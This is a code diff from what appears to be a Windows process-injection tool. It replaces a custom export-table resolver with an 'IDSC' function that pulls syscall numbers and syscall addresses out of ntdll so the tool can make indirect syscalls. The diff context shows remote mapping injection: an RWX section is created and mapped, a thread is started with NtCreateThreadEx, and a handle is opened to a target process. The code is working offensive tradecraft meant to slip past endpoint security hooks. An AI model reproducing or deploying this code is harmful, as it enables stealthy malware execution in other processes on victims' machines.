@@ -3,132 +3,30 @@
 #pragma comment (lib, "OneCore.lib")
 
 
-FARPROC HiddenProcAddress
+VOID IDSC
 (
-	IN HMODULE hModule,
-	IN LPCSTR ApiName
+	IN HMODULE ntdll,
+	IN LPCSTR NtApi,
+	OUT DWORD* FuncSSN,
+	OUT PUINT_PTR FuncSyscall
 )
-
-
-{
-	static BOOL printedInfo = FALSE;
-
-
-	// https://github.com/xalicex/Get-DLL-and-Function-Addresses/blob/main/GetModGetProc.c
-
-	/* pBase --> Represents the base address as we will being using it to get the RVA */
-
-	PBYTE pBase = (PBYTE)hModule;
-
-	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
-	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
-	{
-		WARN("Could not Successfully Create a Variable to the Image Dos Header Magic Letters (MZ)");
-		return NULL;
-	}
-
-
-	/* pImgDos->e_lfanew ---> Points to the start of a new Executable */
-	PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
-	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
-	{
-		WARN("Could not Successfully point to the NT Headers!");
-		return NULL;
-	}
-
-
-	/* Optional Header is stored inside the NT headers, and is exactly the same as the older, COFF headers */
-	IMAGE_OPTIONAL_HEADER pImgOpt = pImgNt->OptionalHeader;
-
-	PIMAGE_EXPORT_DIRECTORY pImgExport = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)pBase + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-	PDWORD Address = (PDWORD)((LPBYTE)pBase + pImgExport->AddressOfFunctions);
-
-	//Get the function names array 
-	PDWORD Name = (PDWORD)((LPBYTE)pBase + pImgExport->AddressOfNames);
-
-	//get the Ordinal array
-	PWORD Ordinal = (PWORD)((LPBYTE)pBase + pImgExport->AddressOfNameOrdinals);
-
-
-	if (!printedInfo)
-	{
-		printf("\n==============================[PE INFORMATION]==============================\n");
-		printf("IMAGE_DOS_HEADER:            [%lu]\n", pImgDos->e_magic);
-		printf("IMAGE_NT_HEADER:             [%lu]\n", pImgNt->Signature);
-		printf("IMAGE_EXPORT_DIRECTORY:      [0x%p]\n", pImgExport);
-		printf("Address Of Names:            [0x%p]\n", Name);
-		printf("Address Of Functions:        [0x%p]\n", Address);
-		printf("Address Of Name Ordinals:    [0x%p]\n\n", Ordinal);
-
-		printedInfo = TRUE;
-	}
-
-
-	//INFO("Trying to get the Address of %s", ApiName);
-
-	for (DWORD i = 0; i < pImgExport->NumberOfFunctions; i++)
-	{
-
-		CHAR* pFuncName = (CHAR*)(pBase + Name[i]);
-
-		PVOID pFuncAddress = (PVOID)(pBase + Address[Ordinal[i]]);
-
-		if (strcmp(ApiName, pFuncName) == 0)
-		{
-			//OKAY("FOUND API: -\t NAME: %s -\t ADDRESS: 0x%p -\t ORDINAL: %d\n", pFuncName, pFuncAddress, Ordinal[i]);
-			return pFuncAddress;
-		}
-
-	}
-
-
-	return NULL;
-
-}
-
-
-
-VOID IndirectPrelude(IN HMODULE mod, IN LPCSTR FuncName, OUT DWORD* FuncSSN, OUT PUINT_PTR FuncSys)
 {
 
-	DWORD SyscallNumber = 0;
+	if (!FuncSSN || !FuncSyscall)
+		return;
 
-	UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };
-
-	UINT_PTR NtFunctionAddress = 0;
-
-	NtFunctionAddress = (UINT_PTR)HiddenProcAddress(mod, FuncName);
-	if (NtFunctionAddress == 0)
+	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
+	if (!NtFunction)
 	{
-		WARN("GetProcAddress Failed! With an Error: %ld", GetLastError());
-		return;
-	}
-
-	BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];
-	BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];
-	*FuncSSN = (byte5 << 8) | byte4;
-
-	*FuncSys = NtFunctionAddress + 0x12;
-
-
-	if (memcmp(SyscallOpcodes, (PVOID)*FuncSys, sizeof(SyscallOpcodes)) == 0) {
-		INFO("[0x%p] [0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, (PVOID)*FuncSys, *FuncSSN, FuncName);
-		return;
-	}
-
-	else {
-		WARN("expected syscall signature: \"0x0f05\" didn't match.");
+		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
 		return;
 	}
 
 
-	/*
+	*FuncSyscall = NtFunction + 0x12;
+	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];
 
-		courtesy of Crr0ww for this function :)
-
-	*/
-
+	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);
 
 }
 
@@ -164,9 +62,9 @@ BOOL RemoteMapInject
 	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
 
 
-	IndirectPrelude(ntdll, "NtCreateSection", &fn_NtCreateSectionSSN, &fn_NtCreateSectionSyscall);
-	IndirectPrelude(ntdll, "NtMapViewOfSection", &fn_NtMapViewOfSectionSSN, &fn_NtMapViewOfSectionSyscall);
-	IndirectPrelude(ntdll, "NtCreateThreadEx", &fn_NtCreateThreadExSSN, &fn_NtCreateThreadExSyscall);
+	IDSC(ntdll, "NtCreateSection", &fn_NtCreateSectionSSN, &fn_NtCreateSectionSyscall);
+	IDSC(ntdll, "NtMapViewOfSection", &fn_NtMapViewOfSectionSSN, &fn_NtMapViewOfSectionSyscall);
+	IDSC(ntdll, "NtCreateThreadEx", &fn_NtCreateThreadExSSN, &fn_NtCreateThreadExSyscall);
 
 
 	STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
@@ -247,8 +145,8 @@ BOOL GetRemoteProcessHandle
 
 	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
 
-	IndirectPrelude(ntdll, "NtQuerySystemInformation", &fn_NtQuerySystemInformationSSN, &fn_NtQuerySystemInformationSyscall);
-	IndirectPrelude(ntdll, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);
+	IDSC(ntdll, "NtQuerySystemInformation", &fn_NtQuerySystemInformationSSN, &fn_NtQuerySystemInformationSyscall);
+	IDSC(ntdll, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);
 
 
 
